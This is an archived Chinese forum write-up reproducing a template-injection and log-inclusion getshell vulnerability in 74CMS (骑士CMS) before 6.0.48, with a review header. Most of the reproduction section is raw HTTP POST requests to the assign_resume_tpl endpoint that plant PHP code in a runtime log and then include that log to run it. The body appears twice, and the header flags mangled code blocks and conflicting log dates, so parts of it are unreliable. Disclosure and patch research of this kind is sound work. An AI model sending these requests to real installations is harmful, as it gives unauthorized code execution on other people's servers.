---
source: "MrWQ/vulnerability-paper"
product: "74CMS骑士人才系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "奇安信攻防社区-骑士CMS模版注入+文件包含getshell漏洞复现"
prerequisites: "来源所述条件，未列明部分仍待核：<6.0.48claimed,test6.0.20; assign_resume_tpl exposed; writablelogs/predictabledate; vulnerableThinkPHPtemplate;authunknown"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://forum.butian.net/share/455"
id: "vw-afc9452b653816f659eb58e3"
entity_id: "ve-afc9452b653816f659eb58e3"
schema_version: "1"
canonical: "Web安全/CMS内容/奇安信攻防社区-骑士CMS模版/奇安信攻防社区-骑士CMS模版注入+文件包含getshell漏洞复现.md"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;6.0.48claimed,test6.0.20; assign_resume_tpl exposed; writablelogs/predictabledate; vulnerableThinkPHPtemplate;authunknown

- **结论使用边界（1）**：全文先把整文压为一大段又完整重复一次，应删同文重复内容。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：代码块内嵌行号/反引号/&amp;amp;/r/n及中文属性翻译，当前报文不能直接重放。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：建议PHP&gt;=5.5而实际5.4.45，需分推荐环境与成功样本；MySQL&gt;=5.7.6要求无机制说明。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：标题源平台名成目录，应并骑士CMS/74CMS；日志日期两样例不同，需核对各自实验环境。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（5）**：有官方show2497公告和补丁页，缺鉴权状态/准确首修可回源补。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 奇安信攻防社区-骑士CMS模版注入+文件包含getshell漏洞复现

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [forum.butian.net](https://forum.butian.net/share/455)

### 骑士CMS模版注入+文件包含getshell漏洞复现

*   [漏洞分析](https://forum.butian.net/topic/48)

#一、骑士CMS简介 骑士人才系统,是一项基于 PHP+MYSQL 为核心开发的一套 免费+开源 专业人才招聘系统，使用了ThinkPHP框架（3.2.3）；由太原迅易科技有限公司于2009年正式推出。为个人求职和企... 一、骑士CMS简介 ========= 骑士人才系统,是一项基于 PHP+MYSQL 为核心开发的一套 免费+开源 专业人才招聘系统，使用了ThinkPHP框架（3.2.3）；由太原迅易科技有限公司于2009年正式推出。为个人求职和企业招聘提供信息化解决方案, 骑士人才系统具备执行效率高、模板切换自由、后台管理功能灵活、模块功能强大等特点，自上线以来一直是职场人士、企业HR青睐的求职招聘平台。经过7年的发展，骑士人才系统已成国内人才系统行业的排头兵。系统应用涉及政府、企业、科研教育和媒体等行业领域，用户已覆盖国内所有省份和地区。2016年全新推出骑士人才系统基础版，全新的“平台+插件”体系，打造用户“DIY”个性化功能定制，为众多地方门户、行业人才提供一个专业、稳定、方便的网络招聘管理平台，致力发展成为引领市场风向的优质高效的招聘软件 二、环境搭建 ====== 此次采用 windows10+Nginx+MySQL+PHP，使用phpstudy进行的环境配置，注意PHP版本最好使用 PHP 5.5及以上，MySQL版本 5.7.6及以上，我这里使用PHP版本5.4.45 然后这里放一下骑士cms的下载链接:<https://pan.hallolck.com/s/y06I6> 三、安装过程 [![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-442be82205f8c98a478d628abb48d20f322a1059.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-442be82205f8c98a478d628abb48d20f322a1059.png) [![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fb62e62638fe2ae78b0e9a582bba47e711c1f2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fb62e62638fe2ae78b0e9a582bba47e711c1f2b.png) [![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d7387724769e2b5c06780d264f037b8f5de68ebb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d7387724769e2b5c06780d264f037b8f5de68ebb.png) [![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-116cf9d59637e279cf1beed20a4c7dfb6de6d023.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-116cf9d59637e279cf1beed20a4c7dfb6de6d023.png) 四、漏洞概述 ====== 官方公告地址 ```php http://www.74cms.com/news/show-2497.html ``` /Application/Common/Controller/BaseController.class.php文件的assign\_resume\_tpl函数因为过滤不严格，导致了模板注入，可以进行远程命令执行 **影响版本:骑士CMS &lt; 6.0.48&gt;** 五、漏洞复现 ====== ### 写入日志 POST参数： ```php http://your-ip/index.php?m=home&amp;a=assign_resume_tpl POST: variable=1&amp;tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/> ``` 我们来POST一下看看 ```php POST /74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl HTTP/1.1 Host: 192.168.1.6 Content-Length: 98 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://192.168.1.6/74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl DNT: 1 Connection: close Cookie: PHPSESSID=vj12p9l3pnqkc09ostum5m7mfu; think_language=zh-CN; think_template=default Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 variable=1&amp;tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show h="info" id="$_GET['id']"/> ``` 可以看到返回了错误，日志已经记录了 [![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4fd3b3ddfa4de3562fa8d104fd4f21a4f5aaf50b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4fd3b3ddfa4de3562fa8d104fd4f21a4f5aaf50b.png) 我们来翻一下日志 ```php 日志路径: \upload\data\Runtime\Logs\Home ``` 成功写入 [![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf107c6247d25577841974570e399666711fd72a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf107c6247d25577841974570e399666711fd72a.png) 接下来我们尝试包含日志，日志名称就是测试当天的年月日 ### 包含日志 POST参数： ```php http://your-ip/index.php?m=home&amp;a=assign_resume_tpl POST: variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_22.log ``` 我们来POST一下看看 ```php POST /74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl HTTP/1.1 Host: 192.168.1.6 Content-Length: 52 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://192.168.1.6/74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl DNT: 1 Connection: close Cookie: PHPSESSID=vj12p9l3pnqkc09ostum5m7mfu; think_language=zh-CN; think_template=default Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 variable=1&amp;tpl=./data/Runtime/Logs/Home/21_07_01.log ``` [![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c26f998261d030de0f01c13e585880c38476f92f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c26f998261d030de0f01c13e585880c38476f92f.png) 六、修复建议 ====== 下载官方最新补丁包 ```php http://www.74cms.com/download/index.html ```

一、骑士CMS简介
=========

骑士人才系统,是一项基于 PHP+MYSQL 为核心开发的一套 免费+开源 专业人才招聘系统，使用了ThinkPHP框架（3.2.3）；由太原迅易科技有限公司于2009年正式推出。为个人求职和企业招聘提供信息化解决方案, 骑士人才系统具备执行效率高、模板切换自由、后台管理功能灵活、模块功能强大等特点，自上线以来一直是职场人士、企业HR青睐的求职招聘平台。经过7年的发展，骑士人才系统已成国内人才系统行业的排头兵。系统应用涉及政府、企业、科研教育和媒体等行业领域，用户已覆盖国内所有省份和地区。2016年全新推出骑士人才系统基础版，全新的“平台+插件”体系，打造用户“DIY”个性化功能定制，为众多地方门户、行业人才提供一个专业、稳定、方便的网络招聘管理平台，致力发展成为引领市场风向的优质高效的招聘软件

二、环境搭建
======

此次采用 windows10+Nginx+MySQL+PHP，使用phpstudy进行的环境配置，注意PHP版本最好使用 PHP 5.5及以上，MySQL版本 5.7.6及以上，我这里使用PHP版本5.4.45

然后这里放一下骑士cms的下载链接:[https://pan.hallolck.com/s/y06I6](https://pan.hallolck.com/s/y06I6)

三、安装过程  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-442be82205f8c98a478d628abb48d20f322a1059.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-442be82205f8c98a478d628abb48d20f322a1059.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fb62e62638fe2ae78b0e9a582bba47e711c1f2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8fb62e62638fe2ae78b0e9a582bba47e711c1f2b.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d7387724769e2b5c06780d264f037b8f5de68ebb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d7387724769e2b5c06780d264f037b8f5de68ebb.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-116cf9d59637e279cf1beed20a4c7dfb6de6d023.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-116cf9d59637e279cf1beed20a4c7dfb6de6d023.png)

四、漏洞概述
======

官方公告地址

```


1.  `http://www.74cms.com/news/show-2497.html`


```

/Application/Common/Controller/BaseController.class.php文件的assign_resume_tpl函数因为过滤不严格，导致了模板注入，可以进行远程命令执行

**影响版本:骑士CMS < 6.0.48>**

五、漏洞复现
======

### 写入日志

POST参数：

```


1.  `http://your-ip/index.php?m=home&amp;a=assign_resume_tpl`
2.  `POST:`
3.  `variable=1&amp;tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>`


```

我们来POST一下看看

```


1.  `POST /74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl HTTP/1.1`
2.  `Host: 192.168.1.6`
3.  `Content-Length: 98`
4.  `Cache-Control: max-age=0`
5.  `Upgrade-Insecure-Requests: 1`
6.  `Content-Type: application/x-www-form-urlencoded`
7.  `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0`
8.  `Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`
9.  `Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2`
10.  `Accept-Encoding: gzip, deflate`
11.  `Referer: http://192.168.1.6/74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl`
12.  `DNT: 1`
13.  `Connection: close`
14.  `Cookie: PHPSESSID=vj12p9l3pnqkc09ostum5m7mfu; think_language=zh-CN; think_template=default`
15.  `Upgrade-Insecure-Requests: 1`
16.  `Cache-Control: max-age=0`

18.  `variable=1&amp;tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show h="info" id="$_GET['id']"/>`


```

可以看到返回了错误，日志已经记录了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4fd3b3ddfa4de3562fa8d104fd4f21a4f5aaf50b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4fd3b3ddfa4de3562fa8d104fd4f21a4f5aaf50b.png)  
我们来翻一下日志

```


1.  `日志路径: \upload\data\Runtime\Logs\Home`


```

成功写入  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf107c6247d25577841974570e399666711fd72a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf107c6247d25577841974570e399666711fd72a.png)

接下来我们尝试包含日志，日志名称就是测试当天的年月日

### 包含日志

POST参数：

```


1.  `http://your-ip/index.php?m=home&amp;a=assign_resume_tpl` 
2.  `POST:` 
3.  `variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_22.log`


```

我们来POST一下看看

```


1.  `POST /74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl HTTP/1.1`
2.  `Host: 192.168.1.6`
3.  `Content-Length: 52`
4.  `Cache-Control: max-age=0`
5.  `Upgrade-Insecure-Requests: 1`
6.  `Content-Type: application/x-www-form-urlencoded`
7.  `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0`
8.  `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`
9.  `Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2`
10.  `Accept-Encoding: gzip, deflate`
11.  `Referer: http://192.168.1.6/74cmsv6.0.20/upload/index.php?m=home&amp;a=assign_resume_tpl`
12.  `DNT: 1`
13.  `Connection: close`
14.  `Cookie: PHPSESSID=vj12p9l3pnqkc09ostum5m7mfu; think_language=zh-CN; think_template=default`
15.  `Upgrade-Insecure-Requests: 1`
16.  `Cache-Control: max-age=0`

18.  `variable=1&amp;tpl=./data/Runtime/Logs/Home/21_07_01.log`


```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c26f998261d030de0f01c13e585880c38476f92f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c26f998261d030de0f01c13e585880c38476f92f.png)

六、修复建议
======

下载官方最新补丁包

```


1.  `http://www.74cms.com/download/index.html`


```

*   发表于 2022-01-20 11:40:21
*   阅读 ( 77 )
*   分类：[WEB安全](https://forum.butian.net/community/Web)
*   [举报](#)

0 推荐 收藏

0 条评论
-----

提交评论

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
